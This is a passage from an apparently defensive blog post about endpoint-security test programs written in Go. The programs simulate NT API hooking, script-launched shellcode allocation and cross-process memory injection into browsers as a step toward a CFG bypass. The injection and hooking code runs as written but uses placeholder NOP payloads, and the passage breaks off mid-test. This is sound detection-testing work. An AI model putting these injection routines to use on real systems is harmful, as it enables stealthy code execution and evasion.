</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="suspicious-windows-nt-api-hooking">suspicious windows NT API hooking</h2>
<p><strong>API hooking</strong> is an attack where the behaviour of system APIs is intercepted and modified. by hooking APIs, attackers strive to alter the way system calls (syscalls) behave, usually to inject payloads or evade detection. hooking critical system APIs subverts normal system operations, and is used in a lot of attacks.</p>
<p>the test first hooks several sensitive NT APIs related to memory management and section mapping. this is done by writing a <code>JMP</code> instruction to redirect the API calls to a custom function, simulating how attackers might hijack the APIs.</p>
<p>the test then dynamically resolves the addresses of these APIs, which is crucial in identifying and hooking specific functions in a live system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> ntdll = windows.<span style="color:#50fa7b">NewLazyDLL</span>(<span style="color:#f1fa8c">&#34;ntdll.dll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Suspicious Windows NT API Hooking [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// define NT API functions to hook
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	hookAPIs <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;ZwCreateSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtCreateSection&#34;</span>, <span style="color:#f1fa8c">&#34;ZwOpenSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtOpenSection&#34;</span>, <span style="color:#f1fa8c">&#34;ZwClose&#34;</span>, <span style="color:#f1fa8c">&#34;NtClose&#34;</span>, <span style="color:#f1fa8c">&#34;ZwMapViewOfSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtMapViewOfSection&#34;</span>, <span style="color:#f1fa8c">&#34;ZwUnmapViewOfSection&#34;</span>, <span style="color:#f1fa8c">&#34;NtUnmapViewOfSection&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// load ntdll + get addresses of APIs
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">for</span> _, api <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> hookAPIs {
</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">:=</span> ntdll.<span style="color:#50fa7b">NewProc</span>(api)
</span></span><span style="display:flex;"><span>		addr <span style="color:#ff79c6">:=</span> proc.<span style="color:#50fa7b">Addr</span>()
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] Address of %s: 0x%X&#34;</span>, api, addr))
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// hook API by writing JMP instruction to custom function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#50fa7b">hookAPI</span>(addr)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;hooked all specified NT APIs&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">hookAPI</span>(addr <span style="color:#8be9fd">uintptr</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// JMP to custom function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	jmp <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0xE9</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>} <span style="color:#6272a4">// JMP rel32
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	relAddr <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>customFunction)) <span style="color:#ff79c6">-</span> (addr <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">*</span><span style="color:#8be9fd">uintptr</span>)(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>jmp[<span style="color:#bd93f9">1</span>])) = relAddr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write JMP to target API address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> oldProtect <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualProtect</span>(addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)), windows.PAGE_EXECUTE_READWRITE, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to change memory protection: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	_, err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(windows.<span style="color:#50fa7b">CurrentProcess</span>(), addr, <span style="color:#ff79c6">&amp;</span>jmp[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)), <span style="color:#ff79c6">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">VirtualProtect</span>(addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(jmp)), oldProtect, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to restore memory protection: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">customFunction</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Custom function to be called by the hooked APIs
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Custom function called by hooked API&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="net-com-object-creation-in-non-standard-windows-script-interpreter">.NET COM object creation in non-standard windows script interpreter</h2>
<p>attackers can create .NET COM objects from within non-standard script interpreters (like VBScript) to execute arbitrary Win32 APIs. scripting languages can be used to execute .NET code and used to achieve similar ends as a more conventional binary payload, which is easily detected.</p>
<p>the test runs a VBScript that attempts to launch <code>notepad.exe</code>. attackers use a script to bootstrap the execution of more complex code.</p>
<p>then, the creation of a .NET COM object and the execution of shellcode within the context of the script is simulated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> scriptPath = <span style="color:#f1fa8c">&#34;C:\\Windows\\Temp\\suspiciousScript.vbs&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting .NET COM object created in non-standard Windows Script Interpreter [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// create new VBS script file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	scriptContent <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">`
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">	Set obj = CreateObject(&#34;WScript.Shell)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">	obj.Run &#34;notepad.exe&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">	`</span>
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">WriteFile</span>(scriptPath, []<span style="color:#8be9fd;font-style:italic">byte</span>(scriptContent), <span style="color:#bd93f9">0644</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to create script file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] VBS script file created&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execute VBS script with wscript.exe
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;wscript.exe&#34;</span>, scriptPath)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to execute script: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Script executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate .NET COM object creation and suspicious API call
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">simulateDotNetCOMObjectCreation</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">simulateDotNetCOMObjectCreation</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate the creation of a .NET COM object in an unexpected script interpreter
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Allocate executable memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	kernel32 <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">NewLazyDLL</span>(<span style="color:#f1fa8c">&#34;kernel32.dll&#34;</span>)
</span></span><span style="display:flex;"><span>	procVirtualAlloc <span style="color:#ff79c6">:=</span> kernel32.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;VirtualAlloc&#34;</span>)
</span></span><span style="display:flex;"><span>	addr, _, err <span style="color:#ff79c6">:=</span> procVirtualAlloc.<span style="color:#50fa7b">Call</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">4096</span>), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> addr <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] VirtualAlloc failed: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] VirtualAlloc executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Write shellcode to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	shellcode <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP instructions (for demonstration)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procWriteProcessMemory <span style="color:#ff79c6">:=</span> kernel32.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;WriteProcessMemory&#34;</span>)
</span></span><span style="display:flex;"><span>	processHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">GetCurrentProcess</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get current process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uintptr</span>
</span></span><span style="display:flex;"><span>	ret, _, err <span style="color:#ff79c6">:=</span> procWriteProcessMemory.<span style="color:#50fa7b">Call</span>(<span style="color:#8be9fd;font-style:italic">uintptr</span>(processHandle), addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>shellcode[<span style="color:#bd93f9">0</span>])), <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(shellcode)), <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>written)))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ret <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] WriteProcessMemory failed: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] WriteProcessMemory executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Remove the created script file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Remove</span>(scriptPath)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to remove script file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">103</span>) <span style="color:#6272a4">// Cleanup failed
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Script file removed&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="potential-browser-exploit-via-fake-rpc-messages">potential browser exploit via fake RPC messages</h2>
<p>this is an attack where specially crafted RPC (Remote Procedure Call) messages are sent to exploit vulnerabilities in web browsers. this can be used to bypass CFG (Control Flow Guard) mitigations, which prevent execution of arbitrary code.</p>
<p>the test first launches several common web browsers and allocates memory in their address spaces. it then writes shellcode to this memory and attempts to execute it via manipulated RPC calls.</p>
<p>it simulates the CFG bypass by exploiting a vulnerability in RPC message handling, specifically <code>NdrServerCall2</code>, which has been used in irl exploits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Potential Browser Exploit via Fake RPC Messages [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	browserProcesses <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;chrome.exe&#34;</span>, <span style="color:#f1fa8c">&#34;msedge.exe&#34;</span>, <span style="color:#f1fa8c">&#34;iexplore.exe&#34;</span>, <span style="color:#f1fa8c">&#34;brave.exe&#34;</span>, <span style="color:#f1fa8c">&#34;whale.exe&#34;</span>, <span style="color:#f1fa8c">&#34;browser.exe&#34;</span>, <span style="color:#f1fa8c">&#34;dragon.exe&#34;</span>, <span style="color:#f1fa8c">&#34;vivaldi.exe&#34;</span>, <span style="color:#f1fa8c">&#34;opera.exe&#34;</span>, <span style="color:#f1fa8c">&#34;seamonkey.exe&#34;</span>, <span style="color:#f1fa8c">&#34;safari.exe&#34;</span>, <span style="color:#f1fa8c">&#34;waterfox.exe&#34;</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, processName <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> browserProcesses {
</span></span><span style="display:flex;"><span>		cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(processName)
</span></span><span style="display:flex;"><span>		err <span style="color:#ff79c6">:=</span> cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to start process %s: %s&#34;</span>, processName, err))
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// memory manipulation with VirtualProtect + WriteProcessMemory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		procHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process.Pid))
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// allocate memory in target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		addr, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAllocEx</span>(procHandle, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// write shellcode to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		shellcode <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP sled as a placeholder
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>		err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(procHandle, addr, <span style="color:#ff79c6">&amp;</span>shellcode[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(shellcode)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// change memory protection to EXECUTABLE
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		oldProtect <span style="color:#ff79c6">:=</span> windows.PAGE_READWRITE
</span></span><span style="display:flex;"><span>		err = windows.<span style="color:#50fa7b">VirtualProtectEx</span>(procHandle, addr, <span style="color:#bd93f9">4096</span>, windows.PAGE_EXECUTE_READ, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to change memory protection: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// call NdrServerCall2
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// this component handles RPC requests + dispatches them to function pointers
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// has been exploited to bypass CFG
